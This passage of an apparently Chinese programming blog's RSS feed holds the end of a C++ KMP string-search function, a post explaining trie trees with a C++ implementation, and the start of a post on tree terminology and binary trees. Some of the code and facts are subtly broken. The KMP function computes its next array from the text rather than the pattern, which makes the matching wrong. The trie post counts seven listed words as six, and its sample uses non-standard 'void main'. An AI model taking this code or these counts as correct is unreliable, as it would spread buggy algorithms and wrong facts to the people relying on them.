&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int KMP(string T,string p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int i=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int* next=getNext(T);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (i &amp;lt; (int)T.length() &amp;amp;&amp;amp; j &amp;lt; (int)p.length())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (j == -1 || T[i] == p[j])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j=next[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (j == (int)p.length())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return i-j;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/</guid>
            <title>字典树及其CPP实现</title>
            <link>https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/</link>
            <pubDate>Sat, 14 Jan 2023 03:46:08 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;1-什么是trie树参考&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-什么是trie树参考&#34;&gt;#&lt;/a&gt; 1、什么是 Trie 树（参考）&lt;/h1&gt;
&lt;p&gt;rie 树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。Trie 的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。&lt;/p&gt;
&lt;h2 id=&#34;字典树3个基本性质&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典树3个基本性质&#34;&gt;#&lt;/a&gt; 字典树 3 个基本性质：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;根节点不包含字符，除根节点外每一个节点都只包含一个字符。&lt;/li&gt;
&lt;li&gt;从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。&lt;/li&gt;
&lt;li&gt;每个节点的所有子节点包含的字符都不相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假设有 b，abc，abd，bcd，abcd，efg，hii 这 6 个单词，我们构建的树就是如下图这样的：&lt;br /&gt;
&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20190408163008821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着他从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是 10。我们可以看到，trie 树每一层的节点数是 26^i 级别的。所以为了节省空间。我们用动态链表，或者用数组来模拟动态。空间的花费，不会超过单词数 × 单词长度。&lt;/p&gt;
&lt;h2 id=&#34;字典树的查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典树的查询&#34;&gt;#&lt;/a&gt; 字典树的查询：&lt;/h2&gt;
&lt;p&gt;使用 trie 时，因为当查询如字符串 abc 是否为某个字符串的前缀时，显然以 b,c,d.... 等不是以 a 开头的字符串就不用查找了。所以建立 trie 的复杂度为 O (n&lt;em&gt;len)，而建立 + 查询在 trie 中是可以同时执行的，建立的过程也就可以成为查询的过程，hash 就不能实现这个功能。所以总的复杂度为 O (n&lt;/em&gt;len)，实际查询的复杂度也只是 O (len)。（说白了，就是 Trie 树的平均高度 h 为 len，所以 Trie 树的查询复杂度为 O（h）=O（len））。&lt;/p&gt;
&lt;h2 id=&#34;字典树优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典树优缺点&#34;&gt;#&lt;/a&gt; 字典树优缺点：&lt;/h2&gt;
&lt;h3 id=&#34;优点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#优点&#34;&gt;#&lt;/a&gt; 优点：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;插入，查询，删除等操作复杂度为 O (h), 其中 h 为单词的长度。为什么会这么快呢，本质是空间换时间（空间复杂度为 26 的 h 次方），利用指针来避免做其他不必要的查找。（初始化的时间复杂度为 n*O (h)，n 为单词个数）；&lt;/li&gt;
&lt;li&gt;当储存大量单词或者说储存的单词有着共同前缀时节省了空间。（比如说用线性存储 boy,boyfriend 如用 trie 存储的差别）；&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#缺点&#34;&gt;#&lt;/a&gt; 缺点：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;指针占用的空间，空间复杂度大。如果储存少量的单词，并不能节省空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;字典树的应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典树的应用&#34;&gt;#&lt;/a&gt; 字典树的应用：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;字符串检索：事先将已知的一些字符串（字典）的有关信息保存到 trie 树里，查找另外一些未知字符串是否出现过或者出现频率。&lt;/li&gt;
&lt;li&gt;字符串最长公共前缀（转化为寻找共同祖先问题）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;字典树和哈希表的比较参考&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典树和哈希表的比较参考&#34;&gt;#&lt;/a&gt; 字典树和哈希表的比较（参考）：&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20190408165347185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-字典树的c实现参考&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-字典树的c实现参考&#34;&gt;#&lt;/a&gt; 2、字典树的 C++ 实现（参考）&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int Num = 26;             //每个节点需要保存26个字母&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct TrieNode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool Isword;                //判断是否是单词&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* next[Num];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode() :Isword(false)   //初始化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        memset(next, NULL, sizeof(next));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Trie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Trie() &amp;#123; root = new TrieNode(); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void insert(string word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool search(string word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void deleteTrie(TrieNode* root);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Trie::insert(string word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* location = root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; word.length();i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;] == nullptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            TrieNode* temp = new TrieNode();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;]=temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        location = location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    location-&amp;gt;Isword = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bool Trie::search(string word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    TrieNode* location = root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //while (word&amp;amp;&amp;amp;location)//注意location不能为空&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; word.length()&amp;amp;&amp;amp;location;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        location = location-&amp;gt;next[word[i] - &amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return(location != NULL &amp;amp;&amp;amp; location-&amp;gt;Isword);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Trie::deleteTrie(TrieNode* root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; Num; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (root-&amp;gt;next[i] != NULL)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            deleteTrie(root-&amp;gt;next[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void main()                     //简单测试  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Trie tree;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n;                      //输入n个单词在字典树中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (n--)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cin &amp;gt;&amp;gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tree.insert(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string input;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; &amp;quot;输入要检查的单词&amp;quot; &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; input;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; boolalpha &amp;lt;&amp;lt; tree.search(input) &amp;lt;&amp;lt; endl;//查找是否存在是个单词&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/</guid>
            <title>CPP树</title>
            <link>https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/</link>
            <pubDate>Sat, 14 Jan 2023 03:27:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#树&#34;&gt;#&lt;/a&gt; 树&lt;/h1&gt;
&lt;h2 id=&#34;树的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#树的定义&#34;&gt;#&lt;/a&gt; 树的定义&lt;/h2&gt;
&lt;p&gt;树是由一个集合以及在该集合上定义的一种关系构成的，集合中的元素称为树的结点，所定义的关系称为父子关系。父子关系在树的结点之间建立了一个层次结构，在这种层次结构中有一个结点具有特殊的地位，这个结点称为该树的根结点。&lt;/p&gt;
&lt;p&gt;数据结构中有很多树的结构，其中包括二叉树、二叉搜索树、2-3 树、红黑树等等，本文着重介绍二叉树。&lt;/p&gt;
&lt;h2 id=&#34;树的基本术语&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#树的基本术语&#34;&gt;#&lt;/a&gt; 树的基本术语&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;节点的度：一个节点含有的子树的个数称为该节点的度；&lt;/li&gt;
&lt;li&gt;叶节点或终端节点：度为 0 的节点称为叶节点；&lt;/li&gt;
&lt;li&gt;非终端节点或分支节点：度不为 0 的节点；&lt;/li&gt;
&lt;li&gt;双亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点；&lt;/li&gt;
&lt;li&gt;孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点；&lt;/li&gt;
&lt;li&gt;兄弟节点：具有相同父节点的节点互称为兄弟节点；&lt;/li&gt;
&lt;li&gt;树的度：一棵树中，最大的节点的度称为树的度；&lt;/li&gt;
&lt;li&gt;节点的层次：从根开始定义起，根为第 1 层，根的子节点为第 2 层，以此类推；&lt;/li&gt;
&lt;li&gt;树的高度或深度：树中节点的最大层次；&lt;/li&gt;
&lt;li&gt;堂兄弟节点：双亲在同一层的节点互为堂兄弟；&lt;/li&gt;
&lt;li&gt;节点的祖先：从根到该节点所经分支上的所有节点；&lt;/li&gt;
&lt;li&gt;子孙：以某节点为根的子树中任一节点都称为该节点的子孙。&lt;/li&gt;
&lt;li&gt;森林：由 m（m&amp;gt;=0）棵互不相交的树的集合称为森林；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;树的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#树的存储结构&#34;&gt;#&lt;/a&gt; 树的存储结构&lt;/h2&gt;
&lt;h3 id=&#34;双亲表示法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#双亲表示法&#34;&gt;#&lt;/a&gt; 双亲表示法&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151650623?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;孩子表示法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#孩子表示法&#34;&gt;#&lt;/a&gt; 孩子表示法&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151704448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二叉树&#34;&gt;#&lt;/a&gt; 二叉树&lt;/h2&gt;
&lt;p&gt;二叉树是数据结构中一种重要的数据结构，也是树表家族最为基础的结构。&lt;/p&gt;
&lt;p&gt;二叉树的定义：二叉树的每个结点至多只有二棵子树 (不存在度大于 2 的结点)，二叉树的子树有左右之分，次序不能颠倒。&lt;/p&gt;
